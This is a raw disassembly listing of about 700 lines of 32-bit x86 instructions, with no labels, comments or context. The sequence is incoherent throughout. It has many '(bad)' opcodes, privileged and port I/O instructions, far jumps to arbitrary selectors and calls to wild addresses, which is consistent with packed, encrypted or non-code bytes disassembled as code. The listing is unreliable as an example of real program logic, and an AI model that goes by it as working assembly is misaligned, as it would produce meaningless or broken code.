  424d2d:	outs   dx,DWORD PTR ds:[esi]
  424d2e:	push   ebx
  424d2f:	pop    edx
  424d30:	mov    DWORD PTR [edx-0x19022f98],0x83bb7a4e
  424d3a:	imul   esi,esi,0x53b33123
  424d40:	pop    eax
  424d41:	xlat   BYTE PTR ds:[ebx]
  424d42:	cli    
  424d43:	mov    ebx,0x5f5a09c1
  424d48:	xchg   ebx,eax
  424d49:	stc    
  424d4a:	jle    0x424d08
  424d4c:	dec    ecx
  424d4d:	lods   al,BYTE PTR ds:[esi]
  424d4e:	pop    ss
  424d4f:	xor    edx,eax
  424d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d52:	int    0xb7
  424d54:	aam    0x42
  424d56:	inc    ebp
  424d57:	jno    0x424d6d
  424d59:	xchg   edi,eax
  424d5a:	pop    ebp
  424d5b:	lods   eax,DWORD PTR ds:[esi]
  424d5c:	popf   
  424d5d:	add    eax,0x6b43939e
  424d62:	sti    
  424d63:	pop    es
  424d64:	cdq    
  424d65:	aam    0xb4
  424d67:	sbb    DWORD PTR [ebp+0x461e9b46],ebp
  424d6d:	imul   esp,DWORD PTR [edi],0xff509c57
  424d73:	mov    ebx,0x596490dd
  424d78:	xchg   DWORD PTR [edx+0x2b],esi
  424d7b:	out    dx,al
  424d7c:	jecxz  0x424d4a
  424d7e:	dec    ebx
  424d7f:	daa    
  424d80:	ins    DWORD PTR es:[edi],dx
  424d81:	je     0x424d73
  424d83:	mov    al,ds:0xbb56b808
  424d88:	sbb    al,0xfd
  424d8a:	fstp   TBYTE PTR [ecx+ebp*2]
  424d8d:	dec    ecx
  424d8e:	or     DWORD PTR [eax+0x2eed9a70],0x4198fd3c
  424d98:	clc    
  424d99:	dec    edx
  424d9a:	mov    eax,0x6dfdabae
  424d9f:	xchg   ecx,eax
  424da0:	push   ecx
  424da1:	adc    BYTE PTR es:[esi+0x22193712],0xb3
  424da9:	add    esp,0x44
  424dac:	in     eax,dx
  424dad:	out    dx,eax
  424dae:	arpl   WORD PTR [eax+0xaa63e41],ax
  424db4:	inc    ebx
  424db5:	add    esp,DWORD PTR [ebx]
  424db7:	cs cmp al,0x41
  424dba:	out    0x5b,eax
  424dbc:	jbe    0x424da0
  424dbe:	in     al,0x52
  424dc0:	pop    ss
  424dc1:	mov    al,0x1c
  424dc3:	xchg   ecx,eax
  424dc4:	sub    edi,edx
  424dc6:	sti    
  424dc7:	push   0x1506b321
  424dcc:	clc    
  424dcd:	ja     0x424d64
  424dcf:	enter  0xd7a3,0xcd
  424dd3:	call   0xa972a9af
  424dd8:	sbb    edi,DWORD PTR [ebp-0x9396b49]
  424dde:	fist   DWORD PTR [ebx]
  424de0:	punpckhdq mm7,QWORD PTR [esi-0x34900cce]
  424de7:	scas   eax,DWORD PTR es:[edi]
  424de8:	test   eax,0xf372fc51
  424ded:	push   esi
  424dee:	inc    esp
  424def:	in     eax,dx
  424df0:	dec    esi
  424df1:	sub    al,0xe5
  424df3:	pop    ebx
  424df4:	or     DWORD PTR [ebx+ebp*1+0xa78627a],ebp
  424dfb:	and    al,0x71
  424dfd:	retf   0x6e84
  424e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e01:	adc    DWORD PTR [edi+0x37],0x26f37ed2
  424e08:	inc    eax
  424e09:	push   es
  424e0a:	enter  0x9ad0,0xcb
  424e0e:	jb     0x424d9b
  424e10:	in     al,0x68
  424e12:	pop    eax
  424e13:	sar    BYTE PTR [ecx],cl
  424e15:	cdq    
  424e16:	push   esi
  424e17:	adc    DWORD PTR [eax-0x5b],ebx
  424e1a:	push   edi
  424e1b:	pop    esi
  424e1c:	loop   0x424e9c
  424e1e:	sbb    esi,DWORD PTR [ebp+0x32d70fec]
  424e24:	pop    esp
  424e25:	sbb    DWORD PTR [edx],ebp
  424e27:	sub    al,0xc9
  424e29:	mov    ss,WORD PTR [esi]
  424e2b:	sbb    eax,0x619b5cdb
  424e30:	ins    BYTE PTR es:[edi],dx
  424e31:	xchg   DWORD PTR [ecx],esp
  424e33:	adc    esi,DWORD PTR [edx-0x6071eff1]
  424e39:	mov    edx,0x1124afd6
  424e3e:	sti    
  424e3f:	pushf  
  424e40:	xchg   ebx,eax
  424e41:	sub    BYTE PTR [eax+0x6e360b52],cl
  424e47:	push   edx
  424e48:	jle    0x424e9b
  424e4a:	(bad)  
  424e4c:	test   DWORD PTR [ebp-0x24a07ff3],esp
  424e52:	jecxz  0x424ebe
  424e54:	push   es
  424e55:	adc    eax,0x9bc85ecd
  424e5a:	push   ds
  424e5b:	pop    ss
  424e5c:	stos   DWORD PTR es:[edi],eax
  424e5d:	mov    eax,0xfbfbb9cc
  424e62:	jle    0x424e1d
  424e64:	fdiv   QWORD PTR [edx]
  424e66:	mov    DWORD PTR [edi+0x664ec47e],esi
  424e6c:	jl     0x424eb1
  424e6e:	test   BYTE PTR ds:0x76b5fa21,ah
  424e74:	push   ds
  424e75:	pop    edx
  424e76:	pop    es
  424e77:	sti    
  424e78:	fsubr  QWORD PTR [ecx+0x8]
  424e7b:	push   edi
  424e7c:	sbb    al,0x16
  424e7e:	pop    esi
  424e7f:	es cmp al,dh
  424e82:	mov    edx,0xe438b629
  424e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e88:	pop    ebp
  424e89:	or     al,0x2d
  424e8b:	loopne 0x424eba
  424e8d:	or     eax,0x336ad627
  424e92:	(bad)  [edi-0x1c]
  424e95:	cmp    eax,0x8c729c23
  424e9a:	mov    cl,0x93
  424e9c:	pusha  
  424e9d:	inc    ebx
  424e9e:	adc    esp,DWORD PTR [eax+eiz*4-0x79f4f4fb]
  424ea5:	out    dx,eax
  424ea6:	inc    ecx
  424ea7:	cld    
  424ea8:	push   edx
  424ea9:	in     eax,dx
  424eaa:	mov    WORD PTR [ecx],gs
  424eac:	lods   eax,DWORD PTR ds:[esi]
  424ead:	dec    ebx
  424eae:	push   es
  424eaf:	imul   esi,DWORD PTR [edx-0x35],0xffffff80
  424eb3:	pop    esi
  424eb4:	js     0x424e72
  424eb6:	push   cs
  424eb7:	pop    edx
  424eb8:	popf   
  424eb9:	jecxz  0x424e94
  424ebb:	ret    0xe7e9
  424ebe:	(bad)  
  424ebf:	mov    al,0x22
  424ec1:	jnp    0x424f25
  424ec3:	sbb    eax,0x96318e80
  424ec8:	dec    eax
  424ec9:	or     ecx,eax
  424ecb:	xchg   edx,eax
  424ecc:	iret   
  424ecd:	into   
  424ece:	gs ret 0xc5
  424ed2:	sbb    eax,0x4dcd9b4e
  424ed7:	rol    BYTE PTR [ebp+0x2e36a5f4],cl
  424edd:	jle    0x47e1eee9
  424ee3:	test   eax,0x179fdcbf
  424ee8:	sti    
  424ee9:	imul   eax,DWORD PTR [ecx+0xd09e3d5],0x4
  424ef0:	pusha  
  424ef1:	retf   
  424ef2:	mov    ebp,0xf6ecc7f1
  424ef7:	ds aas 
  424ef9:	loop   0x424ea5
  424efb:	aaa    
  424efc:	out    dx,eax
  424efd:	fnstsw WORD PTR [edi+eax*4+0x26]
  424f01:	inc    ecx
  424f02:	xor    dl,BYTE PTR [eax-0x2cd87aa8]
  424f08:	pop    ds
  424f09:	jb     0x424f2c
  424f0b:	out    0xa0,al
  424f0d:	sahf   
  424f0e:	pop    es
  424f0f:	push   ebx
  424f10:	dec    edi
  424f11:	adc    al,ch
  424f13:	movs   WORD PTR es:[edi],WORD PTR cs:[esi]
  424f16:	sub    BYTE PTR [ebx],ah
  424f18:	jbe    0x424f79
  424f1a:	aam    0xd5
  424f1c:	jp     0x424ec5
  424f1e:	addr16 jb 0x424ee0
  424f21:	jle    0x424eac
  424f23:	xor    bh,BYTE PTR [ebp+0x14183679]
  424f29:	cmc    
  424f2a:	mov    ebp,DWORD PTR [ecx]
  424f2c:	clc    
  424f2d:	and    al,0xbf
  424f2f:	daa    
  424f30:	dec    ecx
  424f31:	dec    esp
  424f32:	js     0x424f74
  424f34:	add    al,0x24
  424f36:	push   es
  424f37:	cmc    
  424f38:	xor    DWORD PTR [edx+0x42],edi
  424f3b:	push   esi
  424f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f3d:	push   0xddf02593
  424f42:	push   cs
  424f43:	cwde   
  424f44:	jb     0x424f24
  424f46:	adc    edx,DWORD PTR [ebx-0x55]
  424f49:	daa    
  424f4a:	enter  0xd66f,0x24
  424f4e:	fisttp DWORD PTR [ebp-0x31]
  424f51:	test   BYTE PTR [esi+0x7b],bh
  424f54:	inc    ebx
  424f55:	mov    bh,0xdf
  424f57:	pushf  
  424f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f59:	or     dh,ch
  424f5b:	inc    esi
  424f5c:	sbb    ecx,esp
  424f5e:	sbb    eax,0x26c5a51b
  424f63:	dec    ebp
  424f64:	outs   dx,BYTE PTR ds:[esi]
  424f65:	sub    dl,BYTE PTR ds:0x44f451b
  424f6b:	mov    ds:0xf9ac8df2,eax
  424f70:	stos   DWORD PTR es:[edi],eax
  424f71:	pop    ebp
  424f72:	push   ebp
  424f73:	ja     0x424f6b
  424f75:	push   ds
  424f76:	(bad)  [edi+0x7c]
  424f79:	mov    ecx,0x19bc2e7f
  424f7e:	into   
  424f7f:	jae    0x424fcd
  424f81:	dec    ebx
  424f82:	loope  0x424fd4
  424f84:	in     eax,dx
  424f85:	cmp    bh,dh
  424f87:	adc    ebp,DWORD PTR [edx-0x4e]
  424f8a:	sbb    eax,esp
  424f8c:	mov    al,cs:0x902d041
  424f92:	(bad)  
  424f93:	fstp   DWORD PTR ds:0x839cb3ce
  424f99:	and    DWORD PTR [ebp+edx*8+0x6f91f31c],esp
  424fa0:	hlt    
  424fa1:	pushf  
  424fa2:	sub    esi,DWORD PTR [eax]
  424fa4:	sahf   
  424fa5:	mov    ebp,0x4cbec45e
  424faa:	(bad)  
  424fac:	scas   eax,DWORD PTR es:[edi]
  424fad:	jbe    0x424f2f
  424faf:	(bad)  
  424fb0:	push   esi
  424fb1:	inc    ecx
  424fb2:	pop    esi
  424fb3:	mov    al,0x5e
  424fb5:	pop    edx
  424fb6:	(bad)  
  424fb7:	jge    0x424f45
  424fb9:	bound  edi,QWORD PTR [ebp+0x4e76cb58]
  424fbf:	inc    eax
  424fc0:	or     al,al
  424fc2:	shr    dh,cl
  424fc4:	(bad)  
  424fc5:	arpl   WORD PTR fs:[ebp-0x515ffcc2],cx
  424fcc:	ins    DWORD PTR es:[edi],dx
  424fcd:	push   ds
  424fce:	inc    ebp
  424fcf:	out    dx,al
  424fd0:	in     eax,0x18
  424fd2:	leave  
  424fd3:	jbe    0x42500b
  424fd5:	ret    
  424fd6:	add    eax,0x86ddeac0
  424fdb:	daa    
  424fdc:	pop    eax
  424fdd:	(bad)  
  424fdf:	push   ecx
  424fe0:	sub    eax,0x693047be
  424fe5:	mov    cl,0xf2
  424fe7:	sbb    edx,DWORD PTR [eax-0x242bf1f4]
  424fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fee:	mov    cs,ebp
  424ff0:	outs   dx,BYTE PTR ds:[esi]
  424ff1:	dec    edx
  424ff2:	test   DWORD PTR [eax],ebp
  424ff4:	addr16 sub al,0x39
  424ff7:	mov    eax,ds:0x61b35341
  424ffc:	inc    edi
  424ffd:	mov    esp,DWORD PTR [ecx+0x4b]
  425000:	push   edx
  425001:	mov    esp,0x3635f718
  425006:	or     al,0xfc
  425008:	or     eax,0xd9692396
  42500d:	in     al,0x75
  42500f:	dec    edi
  425010:	mov    eax,0x903c3e89
  425015:	cmp    eax,0xeaa47c3a
  42501a:	xchg   DWORD PTR [ebp+0x2f1d4bf],esp
  425020:	xchg   ecx,eax
  425021:	adc    eax,0xc7f3087c
  425026:	std    
  425027:	test   eax,0x17f70c5e
  42502c:	xchg   ebx,eax
  42502d:	sub    dl,BYTE PTR [edx-0x1fc5a7b]
  425033:	xchg   cl,dl
  425035:	jno    0x424ffc
  425037:	push   ebx
  425038:	call   0x9b2334e9
  42503d:	shl    dh,1
  42503f:	xor    eax,0x79334ea0
  425044:	add    ecx,DWORD PTR ds:0xfc8497dd
  42504a:	mov    eax,0x73f69e14
  42504f:	push   esi
  425050:	std    
  425051:	fdiv   DWORD PTR [ecx+0x9]
  425054:	jnp    0x424ffa
  425056:	(bad)  
  425057:	jl     0x4250a9
  425059:	dec    eax
  42505a:	pop    ds
  42505b:	sbb    ebp,DWORD PTR [ebx+0x6bfb7d94]
  425061:	xor    al,0x5c
  425063:	add    al,0x22
  425065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425066:	mov    ah,0x78
  425068:	push   ebx
  425069:	test   eax,0xc52bdd9e
  42506e:	add    DWORD PTR [edx-0x44cdcc0],0xfffffff3
  425075:	push   esi
  425076:	cmp    BYTE PTR [ebp-0x61c8544],dh
  42507c:	lds    ecx,FWORD PTR [eax-0x49130ad8]
  425082:	out    0xd5,al
  425084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425085:	add    al,0xe6
  425087:	mov    dh,0xea
  425089:	inc    esp
  42508a:	mov    edi,0xa3022e3b
  42508f:	(bad)
  425093:	jle    0x4250dc
  425095:	ins    DWORD PTR es:[edi],dx
  425096:	popf   
  425097:	test   eax,0xe625a0ca
  42509c:	aad    0xdb
  42509e:	pop    ss
  42509f:	adc    al,0x70
  4250a1:	jmp    0x42502f
  4250a3:	pop    edi
  4250a4:	dec    ecx
  4250a5:	sub    eax,0x4bcffde1
  4250aa:	xchg   edx,eax
  4250ab:	sahf   
  4250ac:	push   cs
  4250ad:	(bad)  
  4250ae:	sub    al,0x66
  4250b0:	jns    0x42511a
  4250b2:	adc    DWORD PTR [eax+0x3bf9f062],eax
  4250b8:	test   cl,bl
  4250ba:	inc    ebx
  4250bb:	xchg   BYTE PTR [ebp-0x39f59d3e],ch
  4250c1:	aad    0x6
  4250c3:	repnz pop eax
  4250c5:	add    DWORD PTR ds:0x40e9d536,0xffffffe4
  4250cc:	jg     0x4250a7
  4250ce:	xchg   edi,eax
  4250cf:	and    eax,DWORD PTR [ebp+0x580b394b]
  4250d5:	shr    BYTE PTR [ebx],1
  4250d7:	lds    edi,FWORD PTR [ebx+0x8]
  4250da:	(bad)  [edx-0x2f]
  4250dd:	push   ebp
  4250de:	adc    DWORD PTR [eax+0x16],esi
  4250e1:	or     bl,bl
  4250e3:	frstor [ebx]
  4250e5:	cmp    BYTE PTR [ebx+0xf],cl
  4250e8:	sbb    DWORD PTR [esi],esi
  4250ea:	dec    ebp
  4250eb:	push   ebp
  4250ec:	jmp    0xd1ee:0x54b85a80
  4250f3:	adc    esi,DWORD PTR [ebx]
  4250f5:	pushf  
  4250f6:	adc    DWORD PTR [eax-0x2473100a],esp
  4250fc:	sub    BYTE PTR [ecx],0xaf
  4250ff:	leave  
  425100:	pop    ss
  425101:	cmp    DWORD PTR [edi-0x1513e663],esp
  425107:	jl     0x425109
  425109:	add    BYTE PTR [ecx+0x55],bl
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x67384f96
  425119:	(bad)  
  42511a:	sub    bl,bh
  42511c:	add    DWORD PTR [eax],eax
  42511e:	xchg   BYTE PTR [esi],al
  425120:	add    BYTE PTR [eax],al
  425122:	inc    ebx
  425123:	pop    es
  425124:	cmp    BYTE PTR [ebx+0x3],bl
  425127:	hlt    
  425128:	rdtsc  
  42512a:	test   eax,0x21732e66
  42512f:	pop    esp
  425130:	jno    0x425193
  425132:	jo     0x4250b8
  425134:	sub    eax,0x777e0cf6
  425139:	mov    cl,0xdc
  42513b:	pop    esi
  42513c:	retf   
  42513d:	cmpxchg edi,ebp
  425140:	(bad)  
  425141:	jns    0x4251b8
  425143:	(bad)  
  425145:	pusha  
  425146:	pop    esp
  425147:	push   cs
  425148:	xchg   edi,eax
  425149:	iret   
  42514a:	pcmpgtw mm4,QWORD PTR [esi+0x1c5f0db3]
  425151:	adc    DWORD PTR [ecx+0x3],ecx
  425154:	mul    DWORD PTR [esi+ebx*4-0x30]
  425158:	leave  
  425159:	sub    eax,0xfb26b941
  42515e:	ret    
  42515f:	fmul   QWORD PTR [esp+esi*1]
  425162:	pop    ss
  425163:	sbb    DWORD PTR [edx+0x48c338ae],edi
  425169:	inc    ecx
  42516a:	push   ecx
  42516b:	push   ss
  42516c:	neg    DWORD PTR [eax]
  42516e:	enter  0x2887,0x2c
  425172:	inc    edi
  425173:	imul   edi,DWORD PTR [eax-0x47c598fd],0x96ae2f76
  42517d:	test   cl,0x69
  425180:	fistp  WORD PTR [ebx+0x75fea03f]
  425186:	cmc    
  425187:	push   0x2
  425189:	(bad)  
  42518a:	in     eax,0x3a
  42518c:	xor    dl,BYTE PTR [ecx]
  42518e:	mul    BYTE PTR [ebp-0xfa68ae2]
  425194:	imul   edx,DWORD PTR [ebx],0x20
  425197:	stos   BYTE PTR es:[edi],al
  425198:	push   ebx
  425199:	data16 shl BYTE PTR [edi+0x25],1
  42519d:	retf   0xc8e1
  4251a0:	xor    eax,DWORD PTR [edi+0x6f]
  4251a3:	xchg   ecx,eax
  4251a4:	inc    edx
  4251a5:	rol    DWORD PTR [ebx-0x371a6fca],cl
  4251ab:	lea    ebx,[edx]
  4251ad:	sar    cl,0x77
  4251b0:	and    bh,BYTE PTR [eax]
  4251b2:	push   ds
  4251b3:	imul   esi,DWORD PTR [esi+0x162d76b3],0xffffffc1
  4251ba:	in     al,dx
  4251bb:	in     eax,dx
  4251bc:	imul   edi,DWORD PTR [ebp-0x6d1262e3],0x8250525a
  4251c6:	fsub   QWORD PTR [edi+0x63]
  4251c9:	xchg   esp,edi
  4251cb:	ficom  DWORD PTR [ecx+eax*8-0x42]
  4251cf:	cmp    eax,0x5dafda67
  4251d4:	shl    DWORD PTR [ebp+0x3f],cl
  4251d7:	mov    esi,0x64d5b975
  4251dc:	add    dh,0x69
  4251df:	scas   eax,DWORD PTR es:[edi]
  4251e0:	data16 cld 
  4251e2:	or     BYTE PTR [edx],dh
  4251e4:	test   al,0x55
  4251e6:	adc    DWORD PTR [ebp+edi*1+0x6cf77e80],esi
  4251ed:	add    ebp,DWORD PTR [eax-0x319511f4]
  4251f3:	iret   
  4251f4:	sbb    BYTE PTR [edi+0x17],dh
  4251f7:	dec    ecx
  4251f8:	xor    eax,0x9f19247a
  4251fd:	pop    ds
  4251fe:	fnstsw WORD PTR [ebp-0x7f7f337c]
  425204:	cmp    DWORD PTR [ebx-0x7a1884c8],0xd51dc657
  42520e:	mov    ds,ecx
  425210:	sub    DWORD PTR [eax],ebp
  425212:	sahf   
  425213:	pop    edx
  425214:	dec    eax
  425215:	sub    DWORD PTR [esi+0x5e5f8739],0xddf34c51
  42521f:	add    cl,BYTE PTR [edx+ebp*8+0x35bb2d66]
  425226:	add    eax,0xe718f917
  42522b:	adc    BYTE PTR [ecx-0x57329f41],cl
  425231:	js     0x425200
  425233:	and    BYTE PTR [esi+0x61ddae4b],bh
  425239:	sbb    cl,ch
  42523b:	adc    DWORD PTR [eax+0x105a86b5],eax
  425241:	call   0x52cbff5d
  425246:	add    edx,0x17962a93
  42524c:	adc    DWORD PTR [edx],esp
  42524e:	jg     0x42526a
  425250:	inc    ecx
  425251:	repnz mov edx,0x4fcd9f8e
  425257:	lahf   
  425258:	popf   
  425259:	sbb    ch,BYTE PTR [edx]
  42525b:	push   eax
  42525c:	pop    ecx
  42525d:	imul   ebx,DWORD PTR [edx+edx*2-0x31],0x78
  425262:	dec    esp
  425263:	jo     0x42525e
  425265:	jg     0x42529a
  425267:	mov    WORD PTR [esi-0x4f],fs
  42526a:	imul   eax,DWORD PTR [esi-0xd],0x78e3d50a
  425271:	test   al,0x5e
  425273:	push   esp
  425274:	scas   al,BYTE PTR es:[di]
  425276:	test   eax,0xd494d722
  42527b:	(bad)  
  42527c:	loope  0x425270
  42527e:	in     al,dx
  42527f:	ins    BYTE PTR es:[edi],dx
  425280:	jmp    0xd52f56ea
  425285:	push   edi
  425286:	dec    esp
  425287:	pop    eax
  425288:	js     0x425301
  42528a:	gs in  al,dx
  42528c:	xchg   edx,edx
  42528e:	dec    edx
  42528f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425290:	stos   DWORD PTR es:[edi],eax
  425291:	pop    edi
  425292:	fwait
  425293:	sti    
  425294:	jo     0x425282
  425296:	(bad)  
  425297:	cwde   
  425298:	cmp    DWORD PTR [ebp+0x77b3f490],ebx
  42529e:	mov    al,ds:0x9b438cfb
  4252a3:	out    dx,al
  4252a4:	jns    0x4252dd
  4252a6:	pusha  
  4252a7:	sbb    esp,edi
  4252a9:	pop    eax
  4252aa:	jno    0x425253
  4252ac:	push   0xc958f481
  4252b1:	lods   eax,DWORD PTR ds:[esi]
  4252b2:	gs (bad) 
  4252b4:	sbb    bl,dl
  4252b6:	cmp    DWORD PTR [esi],esp
  4252b8:	inc    eax
  4252b9:	xor    dl,BYTE PTR [edx]
  4252bb:	in     al,0x77
  4252bd:	inc    esi
  4252be:	cmp    BYTE PTR [ebx-0x6ad76f2],bh
  4252c4:	repz and DWORD PTR [eax+0x3a],0xffffff84
  4252c9:	mov    bh,0xf5
  4252cb:	stos   DWORD PTR es:[edi],eax
  4252cc:	je     0x4252c2
  4252ce:	movq   QWORD PTR [ecx-0x8],mm6
  4252d2:	cmc    
  4252d3:	out    0x2b,eax
  4252d5:	cs jae 0x4252a4
  4252d8:	cmp    eax,0xed3f3870
  4252dd:	xor    al,0x9e
  4252df:	ss mov edi,0xa50463d9
  4252e5:	pop    esp
  4252e6:	scas   al,BYTE PTR es:[edi]
  4252e7:	mov    DWORD PTR [ebp+0x6e],edx
  4252ea:	sbb    esi,DWORD PTR [ebx]
  4252ec:	xchg   esi,eax
  4252ed:	hlt    
  4252ee:	push   ecx
  4252ef:	call   0x472a:0xf830ff4e
  4252f6:	jge    0x42529f
  4252f8:	add    al,0xe8
  4252fa:	dec    edi
  4252fb:	test   DWORD PTR [ecx+0x14],edi
  4252fe:	lods   eax,DWORD PTR ds:[esi]
  4252ff:	pop    edx
  425300:	sbb    al,0x93
  425302:	fsub   QWORD PTR [esi-0x33]
  425305:	sbb    eax,0xe37f604f
  42530a:	sbb    eax,0x49c7fe36
  42530f:	mov    ah,bl
  425311:	sbb    eax,0x14c25bd9
  425316:	sbb    eax,0x9db93ffe
  42531b:	mov    ch,0xb2
  42531d:	sbb    cl,BYTE PTR fs:[ebp-0x49]
  425321:	push   esi
  425322:	in     eax,0x3e
  425324:	stos   BYTE PTR es:[edi],al
  425325:	test   BYTE PTR [ebx+0x1c],cl
  425328:	cmc    
  425329:	dec    edi
  42532a:	fwait
  42532b:	dec    ebx
  42532c:	cmp    eax,edx
  42532e:	jle    0x42538c
  425330:	ja     0x4252d0
  425332:	nop
  425333:	or     BYTE PTR [ecx-0x16616841],bh
  425339:	test   eax,0xaacfd70b
  42533e:	loop   0x4253a4
  425340:	mov    al,ds:0x54e829f1
  425345:	fdiv   QWORD PTR [ebp+0xc1bc26d]
  42534b:	xchg   edi,eax
  42534c:	push   0x9940dbbd
  425351:	loopne 0x425311
  425353:	lahf   
  425354:	dec    esp
  425355:	sub    ecx,ecx
  425357:	add    DWORD PTR [ecx],edx
  425359:	(bad)  
  42535b:	imul   ebx,DWORD PTR [esi-0x530794],0xfffffff7
  425362:	push   ss
  425363:	sbb    DWORD PTR [ebp+0x5a7ee49e],ecx
  425369:	inc    ebp
  42536a:	jae    0x42533c
  42536c:	jae    0x42531d
  42536e:	or     DWORD PTR [ecx+0x5b],esp
  425371:	sahf   
  425372:	adc    eax,0x8371f028
  425377:	clc    
  425378:	push   ecx
  425379:	lods   eax,DWORD PTR ds:[esi]
  42537a:	add    cl,dl
  42537c:	jmp    0x8163:0xe46dd6f2
  425383:	out    0xb,eax
  425385:	dec    eax
  425386:	sub    edx,DWORD PTR [esi+0x5c]
  425389:	fild   DWORD PTR [edx]
  42538b:	or     ebx,esp
  42538d:	adc    eax,0xdadaebbe
  425392:	mov    cl,0xac
  425394:	arpl   si,dx
  425396:	cmp    esi,edi
  425398:	adc    dl,BYTE PTR [ecx]
  42539a:	loopne 0x42534d
  42539c:	xor    ebx,DWORD PTR [ebx+0x62]
  42539f:	icebp  
  4253a0:	not    esp
  4253a2:	popa   
  4253a3:	cmp    DWORD PTR [ecx-0x20],ecx
  4253a6:	cwde   
  4253a7:	int3   
  4253a8:	not    bh
  4253aa:	jmp    0x629d:0x3796c27f
  4253b1:	xchg   edx,eax
  4253b2:	or     ecx,DWORD PTR [edx-0x22905c43]
  4253b8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4253ba:	mov    ds:0x8071b921,al
  4253bf:	jmp    0x9eafb6e
  4253c4:	lds    ecx,FWORD PTR ds:0x8d7913a9
  4253ca:	jp     0x4253bd
  4253cc:	and    edi,DWORD PTR [edi-0x63]
  4253cf:	div    DWORD PTR [eax]
  4253d1:	xlat   BYTE PTR ds:[ebx]
  4253d2:	sahf   
  4253d3:	(bad)  
  4253d4:	imul   esp,DWORD PTR [esi-0x12],0xfffffff6
  4253d8:	jo     0x42543b
  4253da:	or     dh,BYTE PTR [eax-0x40]
  4253dd:	repz imul ecx,DWORD PTR [esi-0x17],0xffffffc0
  4253e2:	pop    ds
  4253e3:	adc    eax,0x9f9668fb
  4253e8:	fwait
  4253e9:	jge    0x4253a4
  4253eb:	add    ecx,DWORD PTR [eax+0x3c08aa2f]
  4253f1:	mov    cl,0xd3
  4253f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253f4:	cmp    dl,dl
  4253f6:	pop    ss
  4253f7:	xchg   ecx,eax
  4253f8:	fdivr  DWORD PTR [edi-0x62beccdf]
  4253fe:	or     al,0xcd
  425400:	test   DWORD PTR [edi+0x7b],eax
  425403:	mov    al,0x2f
  425405:	add    BYTE PTR [ebx],0xd9
  425408:	sbb    dl,ah
  42540a:	pop    ds
  42540b:	dec    esp
  42540c:	sbb    esi,DWORD PTR [esi+0x38841dff]
  425412:	into   
  425413:	mov    esi,0x5905f3a0
  425418:	jmp    0xb23e:0xf0254b74
  42541f:	add    eax,0xa5cbacb6
  425424:	cld    
  425425:	add    esp,DWORD PTR [ecx]
  425427:	adc    BYTE PTR [edi-0x7],bl
  42542a:	fs xor esi,edx
  42542d:	sti    
  42542e:	mov    ch,0x8d
  425431:	add    al,0xb8
  425433:	adc    bl,al
  425435:	aas    
  425436:	pop    eax
  425437:	mov    ebx,0x72055122
  42543c:	bound  esi,QWORD PTR [eax]
  42543e:	mov    esi,es
  425440:	sub    dh,BYTE PTR [edx+eiz*1+0x4e]
  425444:	xchg   BYTE PTR [ebx+ecx*8],bl
  425447:	cmp    al,0x1e
  425449:	je     0x425470
  42544b:	rcr    BYTE PTR [eax],1
  42544d:	pop    ecx
  42544e:	adc    BYTE PTR [ebx-0x2e],0xe1
  425452:	(bad)  
  425453:	and    DWORD PTR [edx-0x65962614],ecx
  425459:	jnp    0x425433
  42545b:	arpl   WORD PTR [eax],bx
  42545d:	xchg   esi,eax
  42545e:	inc    edi
  42545f:	jecxz  0x42546c
  425461:	aam    0x6e
  425463:	inc    esi
  425464:	es loop 0x425474
  425467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425468:	adc    al,0xc9
  42546a:	loope  0x425492
  42546c:	add    edx,DWORD PTR [edx]
  42546e:	sar    esi,0x3a
  425471:	pop    esi
  425472:	(bad)  
  425473:	lods   al,BYTE PTR ds:[esi]
  425474:	and    al,0x1e
  425476:	clc    
  425477:	in     eax,0x6
  425479:	pop    ecx
  42547a:	jmp    0x4289:0xbd06e741
  425481:	outs   dx,BYTE PTR ds:[esi]
  425482:	pop    esi
  425483:	int    0x7
  425485:	inc    edx
  425486:	imul   esp,DWORD PTR [esi],0x6b
  425489:	sub    DWORD PTR [eax],ecx
  42548b:	xor    eax,edi
  42548d:	retf   0x4724
  425490:	adc    ah,BYTE PTR [edx+0x6]
  425493:	add    edx,DWORD PTR ds:0x454be23c
  425499:	dec    edi
  42549a:	jmp    0x96900f66
  42549f:	cmp    bl,BYTE PTR [ebx+0x5206615]
  4254a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254a6:	inc    eax
  4254a7:	arpl   WORD PTR [edi+0x4869d651],bp
  4254ad:	std    
  4254ae:	or     al,0x22
  4254b0:	xchg   ebp,eax
  4254b1:	and    ebp,DWORD PTR [ebp-0x9b89f8]
  4254b7:	jp     0x42547d
  4254b9:	ret    
  4254ba:	arpl   WORD PTR [ebp-0x4c],dx
  4254bd:	shl    BYTE PTR [edi-0x1fb74d32],1
  4254c3:	stc    
  4254c4:	cli    
  4254c5:	mov    es,WORD PTR [ecx-0x51]
  4254c8:	int3   
  4254c9:	xchg   DWORD PTR [edi],edi
  4254cb:	imul   esp,DWORD PTR [ebx-0x76],0x8807e67e
  4254d2:	stos   DWORD PTR es:[edi],eax
  4254d3:	shr    BYTE PTR [esi+0x67ed3db1],0x6d
  4254da:	push   edi
  4254db:	popf   
  4254dc:	xor    DWORD PTR [edi],edi
  4254de:	xor    eax,0x194c1dc1
  4254e3:	daa    
  4254e4:	ss xchg BYTE PTR ss:[esi-0x4ccefc73],ch
  4254ec:	push   ebp
  4254ed:	cmp    dh,BYTE PTR [eax]
  4254ef:	push   0xffffffa9
  4254f1:	pop    ebx
  4254f2:	sub    al,0xf1
  4254f4:	sub    eax,0xba90877e
  4254f9:	pushf  
  4254fa:	mov    al,0x2
  4254fc:	inc    ebx
  4254fd:	aas    
  4254fe:	xchg   esp,eax
